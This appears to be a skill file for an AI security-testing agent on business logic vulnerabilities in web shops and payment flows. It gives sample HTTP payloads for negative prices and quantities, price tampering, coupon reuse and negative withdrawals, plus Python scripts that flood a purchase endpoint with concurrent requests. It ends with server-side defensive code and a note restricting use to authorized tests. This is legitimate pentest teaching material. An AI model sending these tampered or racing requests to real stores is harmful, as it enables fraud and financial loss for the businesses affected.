---
name: business-logic-testing
Description: Professional skills and methodologies for business logic vulnerability testing
version: 1.0.0
---

#Business logic vulnerability testing

## Overview

Business logic vulnerabilities are design flaws in the business processing flow of applications, which may lead to unauthorized operations, data tampering, financial losses, etc. This skill provides methods for detecting, exploiting and protecting business logic vulnerabilities.

## Vulnerability type

### 1. Workflow bypass

**SKIP VERIFICATION STEP:**
- Direct access to final steps
- Modify the order of steps
- Repeat steps

### 2. Price operation

**Negative Price:**
- Enter a negative amount
- Causes account balance to increase

**Price Tampering:**
- Modify front-end price
- Modify price in API request

### 3. Quantity limit bypass

**Negative number:**
- Enter a negative number
- May lead to increased inventory

**Limit exceeded:**
- Modify quantity limit
-Batch operation bypass

### 4. Time competition

**Concurrent requests:**
- Send multiple requests at the same time
- Bypass one time limit

### 5. Status operation

**Status fallback:**
- Change completed orders to pending payment
- Modify order status

## Test method

### 1. Workflow analysis

**Identify business process:**
- Registration process
- Purchase process
- Withdrawal process
- Review process

**Test step skipped:**
```
Normal process: Step 1 → Step 2 → Step 3
Test: Direct access to step 3
Test: Step 1 → Step 3 (skip step 2)
```

### 2. Parameter tampering

**Modify key parameters:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # Modified to 0.01
}
```

**Negative test:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. Concurrency testing

**Send requests simultaneously:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase', 
                  json={'product_id': 123, 'quantity': 1})

#Send 10 requests at the same time
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. Status modification

**Modify order status:**
```http
PATCH /api/order/123
{
  "status": "completed"  # Modified as completed
}
```

**Fallback status:**
```http
PATCH /api/order/123
{
  "status": "pending"  # Return from completed to pending payment
}
```

## Leverage technology

### Price operation

**Negative Price:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Modify front-end price:**
```javascript
// Front-end code
const price = 100.00;

// Modify to
const price = 0.01;
```

**API price modification:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # Original price 100.00
      "quantity": 1
    }
  ]
}
```

### Quantity limit bypass

**Negative number:**
```json
{
  "product_id": 123,
  "quantity": -10  # May lead to increased inventory
}
```

**Limit exceeded:**
```json
{
  "product_id": 123,
  "quantity": 999999  # Single purchase limit exceeded
}
```

### Coupon Abuse

**Reuse:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# Reuse the same coupon
```

**Coupon not activated:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # Use expired coupons
  "items": [...]
}
```

### Withdrawal vulnerability

**Withdrawal of negative amounts:**
```json
{
  "amount": -1000.00  # May cause account balance to increase
}
```

**Excess balance:**
```json
{
  "amount": 999999.00  # Account balance exceeded
}
```

### Time competition

**Concurrent Purchases:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Limited time sale, concurrent requests
for i in range(100):
    threading.Thread(target=buy).start()
```

## Bypass technology

### Front-end verification bypass

**Call API directly:**
- Bypass front-end JavaScript validation
- Send API requests directly

**Modification Request:**
- Interception using Burp Suite
- Send after modifying parameters

### Status code analysis

**Observe response:**
- 200 OK - Likely successful
- 400 Bad Request - Parameter error
- 403 Forbidden - Insufficient permissions
- 500 Internal Server Error - Server error

### Error message exploitation

**Get information from error message:**
```
Error: "Insufficient balance, current balance: 100.00"
→Account balance information can be obtained
```

## Tool usage

### Burp Suite

**Use Repeater:**
1. Intercept business requests
2. Modify key parameters
3. Observe the response

**Using Intruder:**
1. Mark parameters
2. Use Payload list
3. Batch testing

### Custom script

```python
import requests
import json

def test_price_manipulation():
# Test price modification
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Validation and reporting

### Verification steps

1. Confirm that business logic restrictions can be bypassed
2. Verify that unauthorized operations can be performed
3. Assess the impact (loss of funds, data tampering, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and business processes
- Unauthorized actions can be performed
- Complete exploitation steps and PoC
- Fix suggestions (server-side verification, business rule checking, etc.)

## Protective measures

### Recommended plan

1. **Server-side verification**
   ```python
   def process_purchase(product_id, quantity, price):
# Get the real price from the database
       real_price = db.get_product_price(product_id)
       
# Verify price
       if price != real_price:
           raise ValueError("Price mismatch")
       
# Verification quantity
       if quantity <= 0:
           raise ValueError("Invalid quantity")
       
# Process purchases
       process_order(product_id, quantity, real_price)
   ```

2. **State machine verification**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"
       
       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }
       
       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Concurrency Control**
   ```python
   import threading
   
   lock = threading.Lock()
   
   def process_order(order_id):
       with lock:
# Check order status
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")
           
# Process the order
           process(order)
   ```

4. **Business Rules Verification**
   ```python
   def validate_business_rules(order):
# Verification quantity limit
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")
       
# Validate price range
       if order.price <= 0:
           raise ValueError("Invalid price")
       
# Verify inventory
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Audit Log**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Notes

- Only conducted in an authorized testing environment
- Avoid any real impact on the business
- Pay attention to the differences between different business processes
- Pay attention to data consistency when testing